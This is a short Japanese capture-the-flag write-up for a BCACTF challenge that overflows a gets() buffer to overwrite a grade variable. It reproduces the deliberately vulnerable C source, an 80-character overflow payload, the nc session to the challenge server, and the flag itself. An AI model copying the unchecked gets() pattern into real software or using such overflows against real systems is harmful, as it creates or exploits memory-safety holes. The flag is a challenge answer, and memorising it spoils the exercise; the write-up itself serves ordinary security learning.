# Writeup

以下のプログラムとその実行ファイルが与えられる。

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char *correct = "abcdefghijklmnopqrstuvwxyz";

int main() {
    int grade = 0;
    char response[50];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("Welcome to your first class at BCA: Honors-level ABCs.");
    puts("Because we expect all our students to be perfect, I'm not going to teach you anything.");
    sleep(2);
    puts("Instead, we're going to have a quiz!");
    puts("And, of course, I expect all of you to know the material already.");
    sleep(2);
    puts("");
    puts("╔════════════════════════╗");
    puts("║ THE QUIZ               ║");
    puts("║                        ║");
    puts("║ 1) Recite the alphabet ║");
    puts("╚════════════════════════╝");
    puts("");
    printf("Answer for 1: ");
    gets(response);

    for (int i = 0; i < 26; ++i) {
        if (response[i] == 0)
            break;
        if (response[i] != correct[i])
            break;

        grade = i * 4;
    }

    if (grade < 60)
        puts("An F? I'm sorry, but you clearly need to study harder.");
    else if (grade < 70)
        puts ("You didn't fail, but you could do better than a D.");
    else if (grade < 80)
        puts("Not terrible, but a C's nothing to write home about.");
    else if (grade < 90)
        puts("Alright, a B's not bad, I guess.");
    else if (grade < 100)
        puts("Ayyy, nice job on getting an A!");
    else if (grade == 100) {
        puts("Perfect score!");
        puts("You are an model BCA student.");
    } else {
        puts("How did you end up here?");
        sleep(2);
        puts("You must have cheated!");
        sleep(2);
        puts("Let me recite the BCA plagarism policy.");
        sleep(2);

        FILE *fp = fopen("flag.txt", "r");

        if (fp == NULL) {
            puts("Darn, I don't have my student handbook with me.");
            puts("Well, I guess I'll just give you a verbal warning to not cheat again.");
            puts("[If you are seeing this on the remote server, please contact admin].");
            exit(1);
        }

        int c;
        while ((c = getc(fp)) != EOF) {
            putchar(c);
            usleep(20000);
        }

        fclose(fp);
    }

    puts("");
    puts("Alright, class dismissed!");
}
```

`gets`で`response[50]`を超えた入力をし、`grade`変数を書き換えればよい。

grade変数の入る`$rbp-0x8`のoffsetを調べたところ、72だったので 72+8 の以下80文字を入力したら上手くいった。

```
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA12345678
```

```
$ nc bin.bcactf.com 49155
Welcome to your first class at BCA: Honors-level ABCs.
Because we expect all our students to be perfect, I'm not going to teach you anything.
Instead, we're going to have a quiz!
And, of course, I expect all of you to know the material already.

╔════════════════════════╗
║ THE QUIZ               ║
║                        ║
║ 1) Recite the alphabet ║
╚════════════════════════╝

Answer for 1: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA12345678
How did you end up here?
You must have cheated!
Let me recite the BCA plagarism policy.

Cheating and Plagiarism Policy
==============================

To plagiarize is to steal and use (the ideas or writings of another) as one’s
own (American Heritage Dictionary, 1973:1001). Legally, plagiarism has been
defined as the act of appropriating the literary composition of another, or
parts or passages of his/her writings, or language of the same, and passing them
off as the product of one’s own mind (O’Rourke v. RKO Radio Pictures: 483). The
student should note that neither of these definitions includes intention or
motivation—it is the act itself which constitutes plagiarism. Ignorance, naiveté
or sloppiness is no excuse.

Consequences for Plagiarism or Cheating
---------------------------------------
1st Offense:
1. A grade of “0” will be given for the assignment or test
2. Option to re-do assignment with the grade for the redone assignment averaged
   with the zero for a final average not to exceed 50%.
3. If a student is caught cheating on a test, the student may retake the test;
   the zero on the first test will be averaged with the score on the retake for
   a maximum final test grade of 50%.
4. Parent notification; required parent conference with an administrator, or
   designee, to determine what further action, if any, should be taken.
5. A recording of the incident is made by the building supervisor.

2nd Offense:
1. A grade of “0” will be given for the assignment or test
2. No make-up option;
3. Parent notification; required parent conference with an administrator, or
   designee, to determine what further action, if any, should be taken.
4. A formal recording of the incident is placed in the student’s folder.
5. A one-day out-of-school suspension is assigned.

3rd Offense:
1. Loss of course credit
2. Required parent conference with an administrator, or designee
3. Up to three-day suspension
4. Recommendation for alternative placement

Plagiarism and cheating are serious offenses and the Board expects all students
to be honest in the presentation and submission of their assignments, homework,
test answers and any other academic works as the product of their own
intellectual efforts. Any student who copies verbatim or paraphrases another’s
words or ideas or who allows one’s own words or ideas to be copied verbatim or
paraphrased shall be guilty of plagiarism. A student who shares his own words or
ideas with another or presents another’s words or ideas and attributes them as
his own is also guilty of plagiarism.

Cheating is acting dishonestly or unfairly in order to gain an advantage. Acts
of cheating may include the submission of work prepared by another but passing
it off as one’s own or copying the work or answers of another. It is also an act
or instance of sharing or allowing to be shared one’s own works, words, answers
or ideas with others. For more information see Board Policy 5701.

The above is copied from
https://www.bergen.org/cms/lib/NJ02213295/Centricity/Domain/9/studentHandbook2020_2021-rev-9-24.pdf
See, I cited my sources, so I'm obviously not plagiarising.

also let me add that that's a pretty ugly url

also also have the flag!
bcactf{now_i_know_my_A_B_Cs!!_next_time_wont_you_cheat_with_me??}

Alright, class dismissed!
```

<!-- bcactf{now_i_know_my_A_B_Cs!!_next_time_wont_you_cheat_with_me??} -->
